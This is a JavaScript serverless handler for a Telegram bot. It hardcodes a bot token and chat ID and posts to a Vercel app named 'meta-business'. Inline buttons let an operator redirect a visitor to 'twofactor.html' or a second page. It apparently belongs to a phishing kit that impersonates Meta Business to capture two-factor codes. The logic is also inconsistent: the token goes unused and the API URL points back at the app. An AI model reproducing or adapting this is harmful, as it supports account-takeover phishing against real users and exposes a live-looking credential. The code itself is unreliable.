// telegram.js

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const body = JSON.parse(req.body);

    // Handle the Telegram update here
    const update = body.update;

    // Add your logic here to handle different types of updates (e.g., button clicks)
    if (update.callback_query) {
      const data = update.callback_query.data;
      // Add logic for redirection based on the button clicked
      if (data === 'twofactor') {
        // Perform the actual redirection logic here
        return res.status(200).json({ message: 'Redirecting to twofactor.html' });
      } else if (data === '2') {
        // Perform the actual redirection logic here
        return res.status(200).json({ message: 'Redirecting to 2.html' });
      }
    }

    // Send the data to your Telegram bot using the API token
    let botToken = '6321067941:AAHtSpOrJynrcadwdbVYYVnXee_GE3PlQL4';
    let chatId = '6395775304';

    // Create custom keyboard with two buttons
    let keyboard = {
      inline_keyboard: [
        [
          { text: 'Go to twofactor.html', callback_data: 'twofactor' },
          { text: 'Go to 2.html', callback_data: '2' }
        ]
      ]
    };

    // Convert the keyboard object to a JSON string
    let replyMarkup = JSON.stringify(keyboard);

    // Construct the URL to send the message with custom keyboard
    let apiUrl = 'https://meta-business-985168798147.vercel.app/api/telegram';

    // Add your logic to send the message to your Telegram bot
    // You might want to use a library like 'axios' for more flexibility
    // This example uses fetch
    fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: 'Your message here',
        reply_markup: replyMarkup,
      }),
    })
    .then(response => response.json())
    .then(data => {
      console.log('Message sent to Telegram:', data);
    })
    .catch(error => {
      console.error('Failed to send data to Telegram:', error);
    });

    return res.status(200).json({ message: 'OK' });
  }

  return res.status(404).json({ message: 'Not Found' });
}
